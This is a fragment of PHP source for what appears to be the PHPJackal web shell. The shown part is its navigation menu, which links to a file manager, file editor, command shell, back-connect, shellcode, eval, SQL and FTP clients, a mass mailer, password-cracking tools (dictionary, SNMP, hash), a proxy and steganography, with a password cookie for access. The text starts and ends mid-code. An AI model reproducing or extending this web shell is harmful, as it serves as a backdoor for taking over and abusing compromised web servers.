...
$s=array('<?php'=>'','<?='=>'','<?'=>'','?><?php echo $cwd;?><?php if($_REQUEST['seC']=='fm')
echo '
...
?><?php if($_REQUEST['seC']=='sysinfo')echo 'class="active"'?><?php echo hlinK("seC=sysinfo&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='fm' || $_REQUEST['seC']=='openit')echo 'class="active"'?><?php echo hlinK("seC=fm&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='edit')echo 'class="active"'?><?php echo hlinK("seC=edit&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='webshell')echo 'class="active"'?><?php echo hlinK("seC=webshell&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='br')echo 'class="active"'?><?php echo hlinK("seC=br&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='asm')echo 'class="active"'?><?php echo hlinK("seC=asm&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='sqlcl')echo 'class="active"'?><?php echo hlinK("seC=sqlcl&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='ftpc')echo 'class="active"'?><?php echo hlinK("seC=ftpc&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='mailer')echo 'class="active"'?><?php echo hlinK("seC=mailer&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='eval')echo 'class="active"'?><?php echo hlinK("seC=eval&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='sc')echo 'class="active"'?><?php echo hlinK("seC=sc&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='cr' || $_REQUEST['seC']=='dic' || $_REQUEST['seC']=='auth' || $_REQUEST['seC']=='fcr' || $_REQUEST['seC']=='snmp' || $_REQUEST['seC']=='hc')echo 'class="active"'?><?php echo hlinK("seC=cr&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='px')echo 'class="active"'?><?php echo hlinK("seC=px&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='steg')echo 'class="active"'?><?php echo hlinK("seC=steg&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='tools')echo 'class="active"'?><?php echo hlinK("seC=tools&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='calc')echo 'class="active"'?><?php echo hlinK("seC=calc&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='phpjackal')echo 'class="active"'?><?php echo hlinK("seC=phpjackal&workingdiR=$cwd");?><?php if($_REQUEST['seC']=='about')echo 'class="active"'?><?php echo hlinK("seC=about&workingdiR=$cwd");?><?php if(isset($_COOKIE['passw']))echo '<li><a href="'. hlinK("seC=logout").'">Logout</a></li>';?><?php
